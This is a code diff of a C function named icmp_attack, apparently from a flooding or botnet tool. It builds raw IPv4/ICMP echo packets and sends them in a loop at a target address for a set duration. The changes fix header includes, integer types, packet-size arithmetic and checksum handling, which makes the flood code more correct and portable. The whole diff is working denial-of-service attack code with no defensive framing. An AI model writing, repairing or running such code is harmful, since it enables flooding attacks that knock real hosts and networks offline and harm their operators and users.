@@ -2,9 +2,11 @@
 
 #include "headers/icmp_attack.h"
 #include <sys/socket.h>
-#include <netinet/ip.h>
-#include <netinet/ip_icmp.h>
+#include <linux/ip.h>
+#include <linux/icmp.h>
 #include <errno.h>
+#include <stddef.h>
+#include <stdint.h>
 
 void* icmp_attack(void* arg) {
     attack_params* params = (attack_params*)arg;
@@ -19,23 +21,27 @@ void* icmp_attack(void* arg) {
         return NULL;
     }
 
-    int packet_size = params->psize > 0 ? params->psize : 56;
-    if (packet_size > 64500) packet_size = 64500;
+    const size_t ip_size = sizeof(struct iphdr);
+    const size_t icmp_size = sizeof(struct icmphdr);
+    
+    size_t base_size = params->psize > 0 ? (size_t)params->psize : 56;
+    if (base_size > 64500) base_size = 64500;
+    size_t packet_size = base_size + ip_size;
 
-    unsigned char *packet = calloc(1, packet_size + sizeof(struct iphdr));
+    unsigned char *packet = calloc(1, packet_size);
     if (!packet) {
         close(sock);
         return NULL;
     }
 
     struct iphdr *iph = (struct iphdr*)packet;
-    struct icmphdr *icmph = (struct icmphdr*)(packet + sizeof(struct iphdr));
+    struct icmphdr *icmph = (struct icmphdr*)(packet + ip_size);
 
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
-    iph->tot_len = htons(packet_size + sizeof(struct iphdr));
-    iph->id = htons(getpid());
+    iph->tot_len = htons((uint16_t)packet_size);
+    iph->id = htons(getpid() & 0xFFFF);
     iph->frag_off = 0;
     iph->ttl = 255;
     iph->protocol = IPPROTO_ICMP;
@@ -49,21 +55,22 @@ void* icmp_attack(void* arg) {
     icmph->un.echo.sequence = 0;
     icmph->checksum = 0;
 
-    unsigned char *payload = packet + sizeof(struct iphdr) + sizeof(struct icmphdr);
-    for (int i = 0; i < packet_size - sizeof(struct icmphdr); i++) {
+    unsigned char *payload = packet + ip_size + icmp_size;
+    for (size_t i = 0; i < base_size - icmp_size; i++) {
         payload[i] = (unsigned char)(i & 0xFF);
     }
 
     time_t end_time = time(NULL) + params->duration;
-    unsigned long packets_sent = 0;
+    uint32_t packets_sent = 0;
     
     while (params->active && time(NULL) < end_time) {
         icmph->un.echo.sequence = htons(packets_sent & 0xFFFF);
         icmph->checksum = 0;
         
-        unsigned short *ptr = (unsigned short*)icmph;
-        unsigned long sum = 0;
-        int icmplen = packet_size;
+        uint16_t *ptr = (uint16_t*)icmph;
+        uint32_t sum = 0;
+        size_t icmplen = base_size;
+        
         while (icmplen > 1) {
             sum += *ptr++;
             icmplen -= 2;
@@ -73,9 +80,9 @@ void* icmp_attack(void* arg) {
         }
         sum = (sum >> 16) + (sum & 0xFFFF);
         sum += (sum >> 16);
-        icmph->checksum = ~sum;
+        icmph->checksum = (uint16_t)~sum;
 
-        if (sendto(sock, packet, packet_size + sizeof(struct iphdr), 0, 
+        if (sendto(sock, packet, packet_size, 0, 
                   (struct sockaddr*)&params->target_addr, sizeof(params->target_addr)) > 0) {
             packets_sent++;
         }
